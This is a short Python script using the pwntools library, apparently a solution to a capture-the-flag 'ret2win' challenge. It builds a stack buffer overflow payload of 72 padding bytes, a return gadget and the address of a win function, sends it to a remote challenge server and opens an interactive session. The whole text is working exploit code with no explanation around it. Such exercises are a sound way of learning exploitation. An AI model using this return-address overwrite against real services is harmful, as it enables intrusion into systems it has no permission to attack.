from pwn import *

win_address = 0x40117a

offset = 72

payload = b"A" * offset

payload += p64(0x000000000040101a)
payload += p64(win_address)



haha = remote("ret2win.chal.imaginaryctf.org",1337)

haha.sendline(payload)


print(haha.recv())

haha.interactive()

